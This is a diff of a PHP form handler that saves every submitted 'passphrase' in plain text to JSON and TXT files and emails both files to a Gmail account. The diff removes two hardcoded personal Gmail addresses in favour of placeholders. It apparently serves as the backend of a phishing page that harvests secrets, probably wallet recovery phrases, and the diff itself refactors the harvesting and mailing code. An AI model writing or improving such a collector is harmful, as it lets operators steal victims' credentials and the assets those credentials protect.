@@ -1,5 +1,5 @@
 <?php
-require 'vendor/autoload.php';
+require_once 'vendor/autoload.php';
 
 use Google\Client;
 use Google\Service\Gmail;
@@ -16,8 +16,8 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
 
     // Define the file path and name
     $filePath = 'submissions/';
-    $fileNameJson = 'passphrases.json';
-    $fileNameTxt = 'passphrases.txt';
+    $jsonFileName = 'passphrases.json';
+    $txtFileName = 'passphrases.txt';
 
     // Create the directory if it doesn't exist
     if (!is_dir($filePath)) {
@@ -32,72 +32,51 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
 
     // Save as JSON
     $jsonData = json_encode($data) . PHP_EOL;
-    file_put_contents($filePath . $fileNameJson, $jsonData, FILE_APPEND);
+    file_put_contents($filePath . $jsonFileName, $jsonData, FILE_APPEND);
 
     // Save as plain text
     $textData = "Passphrase: " . $passphrase . " | Timestamp: " . $data['timestamp'] . PHP_EOL;
-    file_put_contents($filePath . $fileNameTxt, $textData, FILE_APPEND);
+    file_put_contents($filePath . $txtFileName, $textData, FILE_APPEND);
 
     // Send email with attachments
-    sendEmailWithAttachments($filePath . $fileNameJson, $filePath . $fileNameTxt);
-
-    echo "Passphrase saved and email sent successfully!";
-} else {
-    echo "Invalid request method.";
-}
-
-function sendEmailWithAttachments($jsonFilePath, $txtFilePath) {
-    $client = new Client();
-    $client->setAuthConfig('credentials.json');
-    $client->addScope(Gmail::MAIL_GOOGLE_COM);
-
-    $service = new Gmail($client);
-
-    $message = new Gmail\Message();
-    $message->setRaw(base64url_encode(createMessageWithAttachments($jsonFilePath, $txtFilePath)));
-
     try {
+        $client = new Client();
+        $client->setAuthConfig('path/to/credentials.json');
+        $client->addScope(Gmail::MAIL_GOOGLE_COM);
+
+        $service = new Gmail($client);
+
+        $message = new Google_Service_Gmail_Message();
+        $boundary = uniqid(rand(), true);
+        $subject = 'New Passphrase Submission';
+        $rawMessageString = "From: sender@example.com\r\n";
+        $rawMessageString .= "To: recipient@example.com\r\n";
+        $rawMessageString .= "Subject: $subject\r\n";
+        $rawMessageString .= "MIME-Version: 1.0\r\n";
+        $rawMessageString .= "Content-Type: multipart/mixed; boundary=\"$boundary\"\r\n\r\n";
+        $rawMessageString .= "--$boundary\r\n";
+        $rawMessageString .= "Content-Type: text/plain; charset=UTF-8\r\n\r\n";
+        $rawMessageString .= "A new passphrase has been submitted.\r\n\r\n";
+        $rawMessageString .= "--$boundary\r\n";
+        $rawMessageString .= "Content-Type: application/json; name=\"$jsonFileName\"\r\n";
+        $rawMessageString .= "Content-Disposition: attachment; filename=\"$jsonFileName\"\r\n";
+        $rawMessageString .= "Content-Transfer-Encoding: base64\r\n\r\n";
+        $rawMessageString .= chunk_split(base64_encode(file_get_contents($filePath . $jsonFileName))) . "\r\n";
+        $rawMessageString .= "--$boundary\r\n";
+        $rawMessageString .= "Content-Type: text/plain; name=\"$txtFileName\"\r\n";
+        $rawMessageString .= "Content-Disposition: attachment; filename=\"$txtFileName\"\r\n";
+        $rawMessageString .= "Content-Transfer-Encoding: base64\r\n\r\n";
+        $rawMessageString .= chunk_split(base64_encode(file_get_contents($filePath . $txtFileName))) . "\r\n";
+        $rawMessageString .= "--$boundary--";
+
+        $message->setRaw(strtr(base64_encode($rawMessageString), array('+' => '-', '/' => '_', '=' => '')));
+
         $service->users_messages->send('me', $message);
+        echo "Passphrase saved and email sent successfully!";
     } catch (Exception $e) {
         echo 'Error: ' . $e->getMessage();
     }
-}
-
-function createMessageWithAttachments($jsonFilePath, $txtFilePath) {
-    $boundary = uniqid(rand(), true);
-    $subject = 'Passphrases File';
-    $from = 'peterjfk243@gmail.com';
-    $to = 'ol37288997@gmail.com';
-
-    $message = "From: $from\r\n";
-    $message .= "To: $to\r\n";
-    $message .= "Subject: $subject\r\n";
-    $message .= "MIME-Version: 1.0\r\n";
-    $message .= "Content-Type: multipart/mixed; boundary=\"$boundary\"\r\n\r\n";
-    $message .= "--$boundary\r\n";
-    $message .= "Content-Type: text/plain; charset=UTF-8\r\n\r\n";
-    $message .= "Attached are the passphrases in JSON and TXT format.\r\n\r\n";
-
-    // Add JSON attachment
-    $message .= "--$boundary\r\n";
-    $message .= "Content-Type: application/json; name=\"passphrases.json\"\r\n";
-    $message .= "Content-Disposition: attachment; filename=\"passphrases.json\"\r\n";
-    $message .= "Content-Transfer-Encoding: base64\r\n\r\n";
-    $message .= chunk_split(base64_encode(file_get_contents($jsonFilePath))) . "\r\n";
-
-    // Add TXT attachment
-    $message .= "--$boundary\r\n";
-    $message .= "Content-Type: text/plain; name=\"passphrases.txt\"\r\n";
-    $message .= "Content-Disposition: attachment; filename=\"passphrases.txt\"\r\n";
-    $message .= "Content-Transfer-Encoding: base64\r\n\r\n";
-    $message .= chunk_split(base64_encode(file_get_contents($txtFilePath))) . "\r\n";
-
-    $message .= "--$boundary--";
-
-    return $message;
-}
-
-function base64url_encode($data) {
-    return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
+} else {
+    echo "Invalid request method.";
 }
 ?>
